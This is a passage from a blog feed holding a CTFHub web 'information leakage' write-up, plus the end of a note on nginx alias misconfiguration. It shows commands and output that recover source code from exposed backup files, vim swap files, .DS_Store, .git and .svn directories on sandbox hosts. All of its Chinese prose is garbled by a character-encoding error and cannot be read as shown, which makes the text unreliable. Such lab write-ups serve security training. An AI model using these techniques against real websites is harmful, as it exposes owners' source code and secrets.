åœ¨ä»£ç†é™æ€æ–‡ä»¶æ—¶ï¼Œå¦‚æœä¸å°å¿ƒåœ¨é…ç½®æ–‡ä»¶ä¸­å†™é”™äº†ä¸€ä¸ªå­—ç¬¦ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">location</span> <span class="hljs-string">/static</span> &#123;<br><span class="hljs-string">alias</span> <span class="hljs-string">/home/web/static/;</span> <br>&#125; <br></code></pre></td></tr></table></figure><p>å°±ä¼šå¯¼è‡´è®¿é—® <code>http://example.com/static../</code> æ—¶å¯ä»¥è®¿é—®ä¸Šçº§ç›®å½•ï¼Œä»è€Œè®¿é—®åˆ°æ•æ„Ÿçš„ä¿¡æ¯ã€‚å…³äº nginx é…ç½®å®‰å…¨ï¼Œ <a href="https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html">ç¦»åˆ«æ­Œçš„è¿™ç¯‡æ–‡ç« </a> å…¶å®å†™å¾—å¾ˆä¸é”™ï¼Œå€¼å¾—æ¯ä¸ªå¼€å‘å’Œè¿ç»´äººå‘˜ä»”ç»†äº†è§£ ã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://www.cnblogs.com/xiaozi/p/12397114.html">å¸¸è§çš„Webæºç æ³„æ¼æ¼æ´åŠå…¶åˆ©ç”¨ - Bypass - åšå®¢å›­ (cnblogs.com)</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> â†©</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://blog.csdn.net/qq_43271194/article/details/109312519">CTFä¸­çš„Webä¿¡æ¯æœé›†_Amire0xçš„å°ä¹å›­-CSDNåšå®¢</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> â†©</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a href="https://evilpan.com/2017/09/22/web-file-disclosure/#é…ç½®æ–‡ä»¶æ³„éœ²">WEBä¸­çš„æ•æ„Ÿæ–‡ä»¶æ³„æ¼ - evilpan</a><a href="#fnref:3" rev="footnote" class="footnote-backref"> â†©</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
      <tag>Leakage</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFHub-Web-ä¿¡æ¯æ³„éœ²</title>
    <link href="/2021/08/08/CTF/Web/Write-up/CTFHub-Web-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    <url>/2021/08/08/CTF/Web/Write-up/CTFHub-Web-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</url>
    
    <content type="html"><![CDATA[<h2 id="1ã€ç›®å½•éå†"><a href="#1ã€ç›®å½•éå†" class="headerlink" title="1ã€ç›®å½•éå†"></a>1ã€ç›®å½•éå†</h2><p>1ï¼‰ç›´æ¥æ‰‹åŠ¨éå†ï¼Œå¾—åˆ° flagï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfhub</span>&#123;a<span class="hljs-number">5</span>b<span class="hljs-number">8</span>e<span class="hljs-number">8</span>d<span class="hljs-number">63</span>b<span class="hljs-number">093</span>a<span class="hljs-number">694</span>ca<span class="hljs-number">4318</span>b&#125;<br></code></pre></td></tr></table></figure><p>2ï¼‰Requests åº“</p><h2 id="2ã€PHPINFO"><a href="#2ã€PHPINFO" class="headerlink" title="2ã€PHPINFO"></a>2ã€PHPINFO</h2><p>1ï¼‰ç›´æ¥æ‰¾</p><p>2ï¼‰<code>Ctrl+F</code> æ‰“å¼€æŸ¥æ‰¾ï¼Œè¾“å…¥å¹¶æœç´¢ flag ï¼Œå¾—åˆ° flagï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfhub</span>&#123;<span class="hljs-number">45</span>f<span class="hljs-number">70</span>ffa<span class="hljs-number">6</span>cd<span class="hljs-number">795</span>e<span class="hljs-number">0948</span>e<span class="hljs-number">9</span>fa<span class="hljs-number">5</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="3ã€å¤‡ä»½æ–‡ä»¶ä¸‹è½½"><a href="#3ã€å¤‡ä»½æ–‡ä»¶ä¸‹è½½" class="headerlink" title="3ã€å¤‡ä»½æ–‡ä»¶ä¸‹è½½"></a>3ã€å¤‡ä»½æ–‡ä»¶ä¸‹è½½</h2><h3 id="1ï¼‰ç½‘ç«™æºç "><a href="#1ï¼‰ç½‘ç«™æºç " class="headerlink" title="1ï¼‰ç½‘ç«™æºç "></a>1ï¼‰ç½‘ç«™æºç </h3><p>é¢˜ç›®ç»™å‡ºå¸¸è§çš„ç½‘ç«™æºç å¤‡ä»½æ–‡ä»¶åå’Œåç¼€ï¼Œæ‰€ä»¥æ–‡ä»¶ä¸€å®šåœ¨å…¶ä¸­ä¸¤ä¸ªç»„åˆä¸­ã€‚å¯ä»¥é€šè¿‡<code>éå†</code>æ‰¾å‡ºæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ <code>disearch</code> æˆ–<code>å¾¡å‰‘</code>æ‰«æå‡ºæ–‡ä»¶ã€‚</p><p><code>dirsearch</code> æ‰«æå‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> python dirsearch.py -u http://challenge-8fecf8af902f41f7.sandbox.ctfhub.com:10800/ -e *</span><br></code></pre></td></tr></table></figure><p>æ‰«æå‡º <code>www.zip</code> æ–‡ä»¶ï¼ŒURL è®¿é—®ä¸‹è½½ï¼Œå‘ç°å‹ç¼©åŒ…ä¸­æœ‰åä¸º <code>flag_377715964.txt</code> çš„æ–‡ä»¶ï¼Œæ‰“å¼€æŸ¥çœ‹ï¼Œå†…å®¹ä¸ºï¼š<code>where is flag ??</code> ï¼Œå°è¯•ç”¨ URL ç›´æ¥è®¿é—®æ–‡ä»¶ ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">http://challenge-8fecf8af902f41f7.sandbox.ctfhub.com:10800/www.zip</span>             <span class="hljs-comment">#è®¿é—®ä¸‹è½½www.zip</span><br><span class="hljs-string">http://challenge-8fecf8af902f41f7.sandbox.ctfhub.com:10800/flag_377715964.txt</span>  <span class="hljs-comment">#ç”¨URLç›´æ¥è®¿é—®æ–‡ä»¶</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ° flagï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">ctfhub&#123;c2e8849c26142934698534ae&#125;</span><br></code></pre></td></tr></table></figure><h3 id="2ï¼‰bakæ–‡ä»¶"><a href="#2ï¼‰bakæ–‡ä»¶" class="headerlink" title="2ï¼‰bakæ–‡ä»¶"></a>2ï¼‰bakæ–‡ä»¶</h3><p>é¢˜ç›®æç¤º <code>Flag in index.php source code</code> ï¼Œè®¿é—® <code>/index.php</code> ï¼Œæ²¡æœ‰ä¸œè¥¿ï¼Œé¢˜ç›®åˆæ˜¯ <code>bakæ–‡ä»¶</code> ï¼Œflag å¯èƒ½åœ¨ <code>.bak</code> é‡Œé¢ï¼ŒURL è®¿é—® <code>index.php.bak</code> ï¼Œä¸‹è½½å¾—åˆ°æºç ï¼Œflag åœ¨æºç é‡Œ ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfhub</span>&#123;<span class="hljs-number">78</span>bdc<span class="hljs-number">17</span>ad<span class="hljs-number">65801</span>bdbf<span class="hljs-number">3</span>fc<span class="hljs-number">26</span>d&#125;<br></code></pre></td></tr></table></figure><h3 id="3ï¼‰vimç¼“å­˜"><a href="#3ï¼‰vimç¼“å­˜" class="headerlink" title="3ï¼‰vimç¼“å­˜"></a>3ï¼‰vimç¼“å­˜</h3><p>é¢˜ç›®æç¤º <code>flag åœ¨ index.php æºç ä¸­</code> ï¼Œè®¿é—® <code>/index.php</code> ï¼Œæ²¡æœ‰ä¸œè¥¿ï¼Œé¢˜ç›®åˆæ˜¯ <code>vimç¼“å­˜(ä¸´æ—¶æ–‡ä»¶)</code> ï¼Œæ‰€ä»¥æ˜¯ <code>SWPæ–‡ä»¶</code> ï¼Œflag å¯èƒ½åœ¨ <code>.index.php.swp</code> é‡Œé¢ï¼ŒURL è®¿é—® <code>.index.php.swp</code> ,ä¸‹è½½æ–‡ä»¶ï¼Œè®°äº‹æœ¬æ‰“å¼€ï¼Œ<code>Ctrl+F</code> æœç´¢ <code>ctfhub</code> ï¼Œå¾—åˆ° flagï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfhub</span>&#123;<span class="hljs-number">4</span>a<span class="hljs-number">8</span>a<span class="hljs-number">5</span>a<span class="hljs-number">6827</span>ef<span class="hljs-number">58</span>eaa<span class="hljs-number">1</span>cb<span class="hljs-number">48</span>c<span class="hljs-number">7</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="4ï¼‰-DS-Store"><a href="#4ï¼‰-DS-Store" class="headerlink" title="4ï¼‰.DS_Store"></a>4ï¼‰.DS_Store</h3><h4 id="Methods-1"><a href="#Methods-1" class="headerlink" title="Methods 1"></a>Methods 1</h4><p>ç”±é¢˜ç›®å¯ä»¥å¾—çŸ¥ï¼Œè¯¥é¢˜ä¸º <code>DS_Store æ–‡ä»¶æ³„éœ²</code>  ï¼Œè®¿é—® <code>.DS_Store</code> ï¼Œä¸‹è½½æ–‡ä»¶ ã€‚ä½¿ç”¨ <code>.DS_Store</code> çš„è§£æå·¥å…· <code>Python-dsstore</code> è¿›è¡Œæ–‡ä»¶çš„è§£ææˆ–è€… <code>cat</code> ç›´æ¥æŸ¥çœ‹ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> python main.py /root/æ¡Œé¢/DS_Store</span><br>Count:  1<br>74dcfc27bb26b65249468deab0aec8c1.txt<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> cat /root/æ¡Œé¢/DS_Store</span><br>Bud1<br>Â·Â·Â·Â·Â·Â·<br>DSDB@ @ @$74dcfc27bb26b65249468deab0aec8c1.txtnoteustr<br>flag hereï¼<br></code></pre></td></tr></table></figure><p>å‘ç°ä¸€ä¸ªæ–‡ä»¶ï¼Œç”¨ URL è®¿é—® ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">http://challenge-d04c378688ecba9a.sandbox.ctfhub.com:10800/.DS_Store</span>      <span class="hljs-comment">#ä¸‹è½½æ–‡ä»¶</span><br><span class="hljs-string">http://challenge-d04c378688ecba9a.sandbox.ctfhub.com:10800/74dcfc27bb26b65249468deab0aec8c1.txt</span>   <span class="hljs-comment">#URL è®¿é—®</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ° flagï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfhub</span>&#123;aeeb<span class="hljs-number">8</span>c<span class="hljs-number">0</span>ba<span class="hljs-number">40</span>d<span class="hljs-number">9</span>cca<span class="hljs-number">11112094</span>&#125;<br></code></pre></td></tr></table></figure><h4 id="Methods-2"><a href="#Methods-2" class="headerlink" title="Methods 2"></a>Methods 2</h4><p>ä½¿ç”¨ <code>.DS_Storeæ–‡ä»¶</code> è§£æå·¥å…· <code>ds_store_exp</code> ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> python ds_store_exp.py http://challenge-ad228a72e55f9db6.sandbox.ctfhub.com:10800/.DS_Store</span><br>[200] http://challenge-ad228a72e55f9db6.sandbox.ctfhub.com:10800/.DS_Store<br>[200] http://challenge-ad228a72e55f9db6.sandbox.ctfhub.com:10800/e31117b96839e81d486c3966e76bf354.txt<br><br></code></pre></td></tr></table></figure><p>å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼Œç”¨ URL è®¿é—®æˆ–ç›´æ¥æ‰“å¼€æŸ¥çœ‹ï¼Œå¾—åˆ° flag ã€‚</p><p>è¿™é‡Œï¼Œé¢˜ç›®ç›´æ¥å‘Šè¯‰äº†æˆ‘ä»¬æ˜¯ <code>DS_Store æ–‡ä»¶æ³„éœ²</code>  ï¼Œå¦‚æœæ²¡å‘Šè¯‰ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ <code>dirsearch</code> æ¥æŠŠå®ƒæ‰«å‡ºæ¥ ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> python3 dirsearch.py -u http://challenge-ad228a72e55f9db6.sandbox.ctfhub.com:10800/ -e <span class="hljs-string">&quot;*&quot;</span></span><br><br>Target: http://challenge-ad228a72e55f9db6.sandbox.ctfhub.com:10800/<br><br>[22:24:06] Starting: <br>[22:24:10] 503 -  605B  - /.document<br><br>Â·Â·Â·Â·Â·Â·<br><br>[22:24:10] 200 -   16KB - /.DS_Store<br><br>Â·Â·Â·Â·Â·Â·<br><br>[22:25:57] 200 -  200B  - /index.html<br><br>Task Completed <br></code></pre></td></tr></table></figure><h2 id="4ã€Gitæ³„éœ²"><a href="#4ã€Gitæ³„éœ²" class="headerlink" title="4ã€Gitæ³„éœ²"></a>4ã€Gitæ³„éœ²</h2><h3 id="1ï¼‰Log"><a href="#1ï¼‰Log" class="headerlink" title="1ï¼‰Log"></a>1ï¼‰Log</h3><p>ä½¿ç”¨ <code>dirsearch</code> è¿›è¡Œæ‰«æï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> python3 dirsearch.py -u http://challenge-21144f4dddfed1c1.sandbox.ctfhub.com:10800/ -e <span class="hljs-string">&quot;*&quot;</span></span><br></code></pre></td></tr></table></figure><p>å‘ç°å¯èƒ½æ˜¯ <code>.gitæ³„éœ²</code> ï¼Œä½¿ç”¨ <code>GitHack</code> è¿›è¡Œå¤„ç†ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> python2 GitHack.py http://challenge-58f241fad417e4d0.sandbox.ctfhub.com:10800/.git</span><br></code></pre></td></tr></table></figure><p>æ‰¾åˆ°ç›¸åº”ç›®å½•ï¼Œä½¿ç”¨ <code>git log</code> æŸ¥çœ‹å†å²è®°å½•</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> git <span class="hljs-built_in">log</span></span><br>commit 9d5b583530f59c07fc62f457066d4ebd81db9782 (HEAD -&gt; master)<br>Author: CTFHub &lt;sandbox@ctfhub.com&gt;<br>Date:   Wed Aug 11 13:22:49 2021 +0000<br><br>    remove flag<br><br>commit 9b5b583530f59c07fc62f457066d4ebd81db9782<br>Author: CTFHub &lt;sandbox@ctfhub.com&gt;<br>Date:   Wed Aug 11 13:22:49 2021 +0000<br><br>    add flag<br><br>commit 9a5b583530f59c07fc62f457066d4ebd81db9782<br>Author: CTFHub &lt;sandbox@ctfhub.com&gt;<br>Date:   Wed Aug 11 13:22:49 2021 +0000<br><br>    init<br><br></code></pre></td></tr></table></figure><p>å½“å‰æ‰€å¤„çš„ç‰ˆæœ¬ä¸º <code>remove flag</code> ï¼Œ<code>flag</code>  å¯èƒ½åœ¨ <code>add flag</code> è¿™æ¬¡æäº¤ä¸­ï¼Œå¯ä»¥ä¸ <code>add flag</code> æäº¤ç‰ˆæœ¬è¿›è¡Œæ¯”å¯¹æˆ–è€…ç›´æ¥åˆ‡æ¢åˆ° <code>add flag</code> æäº¤ç‰ˆæœ¬ ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">//æ¯”è¾ƒç‰ˆæœ¬<br><span class="hljs-meta">#</span><span class="bash"> git diff 9b5b583530f59c07fc62f457066d4ebd81db9782</span><br>//åˆ‡æ¢ç‰ˆæœ¬<br><span class="hljs-meta">#</span><span class="bash"> git reset --hard 9b5b583530f59c07fc62f457066d4ebd81db9782</span><br></code></pre></td></tr></table></figure><p>æ¯”è¾ƒç‰ˆæœ¬å¯ä»¥ç›´æ¥å¾—åˆ° flag ï¼Œåˆ‡æ¢ç‰ˆæœ¬ä¼šå¾—åˆ°å‡ ä¸ªæ–‡ä»¶ï¼Œæ‰“å¼€ <code>.txt</code> æ–‡ä»¶ï¼Œå¾—åˆ° flagï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfhub</span>&#123;<span class="hljs-number">107</span>f<span class="hljs-number">71</span>b<span class="hljs-number">7</span>e<span class="hljs-number">778</span>af<span class="hljs-number">3</span>f<span class="hljs-number">1</span>bbf<span class="hljs-number">4487</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="2ï¼‰Stash"><a href="#2ï¼‰Stash" class="headerlink" title="2ï¼‰Stash"></a>2ï¼‰Stash</h3><p>ä½¿ç”¨ <code>dirsearch</code> è¿›è¡Œæ‰«æï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> python3 dirsearch.py -u http://challenge-5d6ff60def13b410.sandbox.ctfhub.com:10800/ -e <span class="hljs-string">&quot;*&quot;</span></span><br></code></pre></td></tr></table></figure><p>å‘ç°å¯èƒ½æ˜¯ <code>.gitæ³„éœ²</code> ï¼Œä½¿ç”¨ <code>GitHack</code> è¿›è¡Œå¤„ç†ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> python2 GitHack.py http://challenge-5d6ff60def13b410.sandbox.ctfhub.com:10800/.git</span><br></code></pre></td></tr></table></figure><p>æ‰¾åˆ°ç›¸åº”ç›®å½•ï¼Œä½¿ç”¨ <code>git log</code> æŸ¥çœ‹å†å²è®°å½•</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> git <span class="hljs-built_in">log</span></span><br>commit 6de721fac74432123c67e910c3d6a3a65652d685 (HEAD -&gt; master)<br>Author: CTFHub &lt;sandbox@ctfhub.com&gt;<br>Date:   Wed Aug 11 13:22:49 2021 +0000<br><br>    remove flag<br><br>commit 58e73246189a7eb7756367821c193aaa6ffd369f<br>Author: CTFHub &lt;sandbox@ctfhub.com&gt;<br>Date:   Wed Aug 11 13:22:49 2021 +0000<br><br>    add flag<br><br>commit 6f2d3b79179d482bdb02514dfbe82f3a1f70a68b<br>Author: CTFHub &lt;sandbox@ctfhub.com&gt;<br>Date:   Wed Aug 11 13:22:49 2021 +0000<br><br>    init<br>    <br></code></pre></td></tr></table></figure><p>å½“å‰æ‰€å¤„çš„ç‰ˆæœ¬ä¸º <code>remove flag</code> ï¼Œ<code>flag</code>  å¯èƒ½åœ¨ <code>add flag</code> è¿™æ¬¡æäº¤ä¸­ï¼Œä¸ <code>add flag</code> æäº¤ç‰ˆæœ¬è¿›è¡Œæ¯”å¯¹ ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> git diff 58e73246189a7eb7756367821c193aaa6ffd369f</span><br>diff --git a/2973298199238.txt b/2973298199238.txt<br>deleted file mode 100644<br>index e358b09..0000000<br>--- a/2973298199238.txt<br>+++ /dev/null<br>@@ -1 +0,0 @@<br>-where is flag<br><br>Â·Â·Â·Â·Â·Â·<br><br></code></pre></td></tr></table></figure><p>æ¯”è¾ƒç‰ˆæœ¬å‘ç°å˜åŒ–æ˜¯ <code>where is flag</code> è€Œä¸æ˜¯ <code>flag</code> ï¼Œåˆ‡æ¢åˆ° <code>add flag</code> ç‰ˆæœ¬æŸ¥çœ‹ <code>.txt</code> æ–‡ä»¶ï¼Œè·Ÿä¸Šé¢ä¸€æ ·ï¼ŒçŒœæµ‹å¯èƒ½è¿›è¡Œäº†æ›´æ”¹ï¼Œå¯ä»¥é€šè¿‡ <code>git stash pop</code> å‘½ä»¤æ¢å¤ä¹‹å‰ç¼“å­˜çš„å·¥ä½œç›®å½•ã€‚</p><blockquote><p>è¿™ä¸ªæŒ‡ä»¤å°†ç¼“å­˜å †æ ˆä¸­çš„ç¬¬ä¸€ä¸ª stash åˆ é™¤ï¼Œå¹¶å°†å¯¹åº”ä¿®æ”¹åº”ç”¨åˆ°å½“å‰çš„å·¥ä½œç›®å½•ä¸‹ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨ <code>git stash apply</code> å‘½ä»¤ï¼Œå°†ç¼“å­˜å †æ ˆä¸­çš„ stash å¤šæ¬¡åº”ç”¨åˆ°å·¥ä½œç›®å½•ä¸­ï¼Œä½†å¹¶ä¸åˆ é™¤ stash æ‹·è´</p></blockquote><p>å¾—åˆ°ä¸€ä¸ª <code>.txt</code> æ–‡ä»¶ï¼ŒæŸ¥çœ‹ï¼Œå¾—åˆ° flagï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfhub</span>&#123;<span class="hljs-number">7419</span>cb<span class="hljs-number">6</span>a<span class="hljs-number">91</span>b<span class="hljs-number">581</span>d<span class="hljs-number">62470863</span>c&#125;<br></code></pre></td></tr></table></figure><h3 id="3ï¼‰Index"><a href="#3ï¼‰Index" class="headerlink" title="3ï¼‰Index"></a>3ï¼‰Index</h3><p>ä½¿ç”¨ <code>dirsearch</code> è¿›è¡Œæ‰«æï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> python3 dirsearch.py -u http://challenge-eb00a79e8f8033f0.sandbox.ctfhub.com:10800/ -e <span class="hljs-string">&quot;*&quot;</span></span><br></code></pre></td></tr></table></figure><p>å‘ç°å¯èƒ½æ˜¯ <code>.gitæ³„éœ²</code> ï¼Œä½¿ç”¨ <code>GitHack</code> è¿›è¡Œå¤„ç†ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> python2 GitHack.py http://challenge-eb00a79e8f8033f0.sandbox.ctfhub.com:10800/.git</span><br></code></pre></td></tr></table></figure><p>æ‰¾åˆ°ç›¸åº”ç›®å½•ï¼Œä½¿ç”¨ <code>git log</code> æŸ¥çœ‹å†å²è®°å½•</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> git <span class="hljs-built_in">log</span></span><br>commit f12bae0c5091515b7a628f4ce5164b277c8c05bd (HEAD -&gt; master)<br>Author: CTFHub &lt;sandbox@ctfhub.com&gt;<br>Date:   Wed Aug 11 14:00:53 2021 +0000<br><br>    add flag<br><br>commit a067ca223b652e73fa3e0705522c5d7ecb936ff7<br>Author: CTFHub &lt;sandbox@ctfhub.com&gt;<br>Date:   Wed Aug 11 14:00:53 2021 +0000<br><br>    init<br></code></pre></td></tr></table></figure><p>å½“å‰æ‰€å¤„çš„ç‰ˆæœ¬ä¸º <code>add flag</code> ï¼Œ<code>flag</code>  å¯èƒ½å°±åœ¨æ­¤ç‰ˆæœ¬ä¸­ ã€‚é‡æ–°åˆ‡æ¢åˆ°å½“å‰ç‰ˆæœ¬ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> git reset --hard</span><br>HEAD ç°åœ¨ä½äº f12bae0 add flag<br></code></pre></td></tr></table></figure><p>å¾—åˆ°ä¸€ä¸ª <code>.txt</code> æ–‡ä»¶ï¼ŒæŸ¥çœ‹ï¼Œå¾—åˆ° flagï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfhub</span>&#123;<span class="hljs-number">1152</span>c<span class="hljs-number">288321</span>eb<span class="hljs-number">80</span>b<span class="hljs-number">9</span>bc<span class="hljs-number">40</span>aa<span class="hljs-number">5</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="5ã€SVNæ³„éœ²"><a href="#5ã€SVNæ³„éœ²" class="headerlink" title="5ã€SVNæ³„éœ²"></a>5ã€SVNæ³„éœ²</h2><p>é¢˜ç›®æ˜¾ç¤ºï¼šFlag åœ¨æœåŠ¡ç«¯æ—§ç‰ˆæœ¬çš„æºä»£ç ä¸­ ã€‚</p><p>ä½¿ç”¨ <code>dirsearch</code> è¿›è¡Œæ‰«æï¼Œå‘ç°å¯èƒ½æ˜¯ <code>SVNæ³„éœ²</code> ï¼Œä½¿ç”¨ <code>dvcs-ripper</code> è¿›è¡Œå¤„ç†ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> perl rip-svn.pl -v -u http://challenge-519d5d6873629d73.sandbox.ctfhub.com:10800/.svn/</span><br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨å·¥å…·çš„æ‰€åœ¨ç›®å½•ä¸‹ç”Ÿæˆäº† <code>.svn</code> æ–‡ä»¶å¤¹ï¼Œä½†æ˜¯ç”±äºéšè—éœ€è¦è¾“å…¥ <code>ls -al</code> å‘½ä»¤æ‰èƒ½çœ‹åˆ° ã€‚</p><p>ä½¿ç”¨ <code>tree</code> å‘½ä»¤æŸ¥çœ‹ <code>.svn</code> å†…çš„å†…å®¹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> tree 